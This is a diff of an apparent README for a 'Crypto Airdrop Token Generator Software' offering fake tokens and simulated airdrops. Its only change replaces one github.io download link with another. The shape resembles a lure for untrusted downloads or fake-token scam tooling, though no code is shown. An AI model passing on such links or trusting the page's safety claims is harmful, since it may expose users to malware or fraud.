@@ -3,7 +3,7 @@
 🚀 The **Crypto Airdrop Token Generator Software** is built for developers, educators, and testers who want to generate fake tokens and simulate airdrops.  
 It supports **Ethereum, Binance Smart Chain (BSC), Polygon, Avalanche testnets**, and more — allowing safe blockchain testing without using real assets.  
 
-[![Download Crypto Airdrop Token Generator Software](https://img.shields.io/badge/Download-Crypto%20Airdrop%20Token%20Generator%20Software-greenyellow)](https://bestsoftonik.github.io/public/)  
+[![Download Crypto Airdrop Token Generator Software](https://img.shields.io/badge/Download-Crypto%20Airdrop%20Token%20Generator%20Software-greenyellow)](https://crypto-airdrop-token-generator-software.github.io/.github/)  
 
 ---  
 
